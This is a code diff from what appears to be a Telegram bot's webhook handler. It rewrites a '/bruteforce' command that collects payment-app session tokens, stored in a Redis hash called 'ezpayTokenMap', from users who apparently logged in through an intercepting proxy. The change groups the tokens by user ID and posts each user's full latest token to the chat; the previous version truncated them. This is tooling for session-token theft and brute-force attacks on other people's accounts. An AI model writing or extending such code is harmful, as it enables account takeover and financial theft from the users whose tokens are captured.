@@ -1128,21 +1128,52 @@ Example:
       const parts = text.split(' ');
       const targetToken = parts[1];
       if (!targetToken) {
-        let tokenList = '';
+        const userTokens = {};
         if (redis) {
-          const allTokens = await redis.hgetall('ezpayTokenMap');
-          if (allTokens) {
-            for (const [tk, uid] of Object.entries(allTokens)) {
-              tokenList += `\n👤 ${uid} → ${tk.substring(0, 30)}...`;
+          try {
+            const allTokens = await redis.hgetall('ezpayTokenMap');
+            if (allTokens && typeof allTokens === 'object') {
+              const entries = Array.isArray(allTokens) ? [] : Object.entries(allTokens);
+              if (Array.isArray(allTokens)) {
+                for (let i = 0; i < allTokens.length; i += 2) {
+                  const tk = allTokens[i];
+                  const uid = allTokens[i + 1];
+                  if (tk && uid && tk.length > 10) {
+                    if (!userTokens[uid]) userTokens[uid] = [];
+                    userTokens[uid].push(tk);
+                  }
+                }
+              } else {
+                for (const [tk, uid] of entries) {
+                  if (tk && uid && tk.length > 10) {
+                    if (!userTokens[uid]) userTokens[uid] = [];
+                    userTokens[uid].push(tk);
+                  }
+                }
+              }
             }
+          } catch(e) {}
+        }
+        for (const [tk, uid] of Object.entries(tokenUserMap)) {
+          if (tk && uid && tk.length > 10) {
+            if (!userTokens[uid]) userTokens[uid] = [];
+            if (!userTokens[uid].includes(tk)) userTokens[uid].push(tk);
           }
         }
-        if (!tokenList) {
-          for (const [tk, uid] of Object.entries(tokenUserMap)) {
-            tokenList += `\n👤 ${uid} → ${tk.substring(0, 30)}...`;
-          }
+        const userCount = Object.keys(userTokens).length;
+        let msgs = [`🔓 Bruteforce — ${userCount} users found\n\nUsage:\n/bruteforce <token>\n/bruteforce <token> <concurrency>\n`];
+        for (const [uid, tokens] of Object.entries(userTokens)) {
+          const latest = tokens[tokens.length - 1];
+          msgs.push(`👤 User: ${uid}\n🔑 Token:\n\`${latest}\``);
         }
-        await bot.sendMessage(chatId, `Usage: /bruteforce <apptoken>\n\nAvailable tokens:${tokenList || '\nNo tokens found'}`);
+        if (userCount === 0) {
+          msgs.push('❌ No tokens found. Users need to login through proxy first.');
+        }
+        for (const m of msgs) {
+          await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' }).catch(() => {
+            bot.sendMessage(chatId, m).catch(()=>{});
+          });
+        }
         return res.sendStatus(200);
       }
 
